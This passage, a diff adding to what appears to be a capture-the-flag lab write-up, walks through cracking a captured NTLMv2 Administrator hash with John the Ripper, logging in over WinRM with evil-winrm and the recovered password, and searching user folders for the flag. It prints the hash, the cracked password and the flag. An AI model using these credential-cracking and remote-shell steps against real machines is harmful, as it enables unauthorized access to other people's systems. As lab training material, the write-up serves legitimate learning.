@@ -46,4 +46,101 @@ and we catch a hash:
 [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:906a2b19adc936fe:FF29D66A31760F0DE9CDB5AC4E1898B9:0101000000000000805B7FF1B1AFDC016C8D89FE87D2020A0000000002000800360036005800370001001E00570049004E002D00380037005A004E0053003200560044004C005200520004003400570049004E002D00380037005A004E0053003200560044004C00520052002E0036003600580037002E004C004F00430041004C000300140036003600580037002E004C004F00430041004C000500140036003600580037002E004C004F00430041004C0007000800805B7FF1B1AFDC0106000400020000000800300030000000000000000100000000200000F3577D4A19A7014741398BDF2A25B3E14915853460E19E6AE75AB33A9F974F870A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0033000000000000000000  
 all we have to do is decrypt it...so lets save it as a txt like hash.txt
 lets use john the ripper:
+┌──(kali㉿kali)-[~]
+└─$ john hash.txt       
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 5 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+badminton        (Administrator)     
+1g 0:00:07:04 DONE 3/3 (2026-03-09 11:03) 0.002357g/s 3914Kp/s 3914Kc/s 3914KC/s badgydgos..badme1686
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+
+We have the password: badminton
+
+So lets use Evil-winRM to get shell for the machine:
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.129.*.* -u Administrator -p badminton          
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---        10/11/2020   7:19 AM                3D Objects
+d-r---        10/11/2020   7:19 AM                Contacts
+d-r---          3/9/2022   5:34 PM                Desktop
+d-r---         3/10/2022   4:51 AM                Documents
+d-r---        10/11/2020   7:19 AM                Downloads
+d-r---        10/11/2020   7:19 AM                Favorites
+d-r---        10/11/2020   7:19 AM                Links
+d-r---        10/11/2020   7:19 AM                Music
+d-r---         4/27/2020   6:01 AM                OneDrive
+d-r---        10/11/2020   7:19 AM                Pictures
+d-r---        10/11/2020   7:19 AM                Saved Games
+d-r---        10/11/2020   7:19 AM                Searches
+d-r---        10/11/2020   7:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/9/2022   5:35 PM                Administrator
+d-----          3/9/2022   5:33 PM                mike
+d-r---        10/10/2020  12:37 PM                Public
+
+
+*Evil-WinRM* PS C:\Users> cd mike
+*Evil-WinRM* PS C:\Users\mike> ls
+
+
+    Directory: C:\Users\mike
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         3/10/2022   4:51 AM                Desktop
+
+
+*Evil-WinRM* PS C:\Users\mike> cd desktop
+*Evil-WinRM* PS C:\Users\mike\desktop> ls
+
+
+    Directory: C:\Users\mike\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+
+here is our flag...
+
+*Evil-WinRM* PS C:\Users\mike\desktop> cat flag.txt
+ea81b7afddd03efaa0945333ed147fac
+
+But with can find the flag file easier: 
+gci -Path C:\Users\ -Filter "*.txt" -Recurse   # this search in only the Users directory...most of the times the personal files are there...
 
